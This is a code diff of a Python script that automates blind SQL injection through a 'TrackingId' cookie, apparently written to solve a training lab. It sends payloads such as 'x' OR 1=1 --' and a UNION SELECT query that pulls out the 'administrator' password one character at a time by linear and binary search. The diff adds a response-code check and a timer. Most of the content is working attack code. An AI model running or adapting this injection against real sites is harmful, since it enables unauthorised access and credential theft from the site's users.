@@ -19,9 +19,20 @@ characters = ["a", "b", "c", "d", "e", "f",
 try_password = []
 query_pass = f"x' UNION SELECT username FROM users WHERE username='administrator' AND password"
 
-#Attempts to run the most current injection that was generated from any of
-#the functions it called from
-#takes a query as the arg
+def IsValid(resp):
+    """
+    Checks if the website returns a valif HTTP response code.
+
+    Args:
+        resp: the response code given to analyze
+    Returns:
+        True/False: If the response code is in 200, then true
+    """
+    if resp.status_code >= 200 and resp.status_code < 300:
+        return True
+    else:
+        return False
+
 def try_query(query):
     """
     Runs query on site for accuracy.
@@ -37,19 +48,24 @@ def try_query(query):
     mycookies = {'TrackingId': urllib.parse.quote_plus(query) }
     resp = requests.get(url, cookies=mycookies)
     soup = BeautifulSoup(resp.text, 'html.parser')
+
+    if IsValid(resp) == False:
+        print("Incorrect Response from Server. Try Again")
+        exit()
+
     if soup.find('div', text='Welcome back!'):
         return True
     else:
         return False
 
 def DetermineLength():
-    '''
+    """
     Determines the length of the password
     by locating the admin password length in SQL
 
     Args:
         none
-    '''
+    """
     #Tests the query fucntion
     try_query("""x' OR 1=1 --""")
     try_query("""x" OR 1=1 --""")
@@ -69,7 +85,7 @@ def DetermineLength():
     return(num)
 
 def LinearSearch(arr, password_length):
-    '''
+    """
     First Loop:
         Begins Linear search to determine the password for the program
         First for loop collects the first character of the password
@@ -81,7 +97,7 @@ def LinearSearch(arr, password_length):
     Args:
         arr:the test set of characters used to find password
         password_length: the total length of the suspect
-    '''
+    """
     for i in range(len(characters)):
         query1 = f"{query_pass} ~ '^{characters[i]}'--"
         if try_query(query1) == False:
@@ -197,6 +213,8 @@ if __name__ == '__main__':
     # print(f'Password: {try_password}')
 
     character_set = string.ascii_lowercase + string.digits
-
+    start_clock = time.perf_counter()
     BinarySearch(character_set)
+    stop_clock = time.perf_counter()
+    print(f"Binary Search Time: {stop_clock-start_clock}")
 
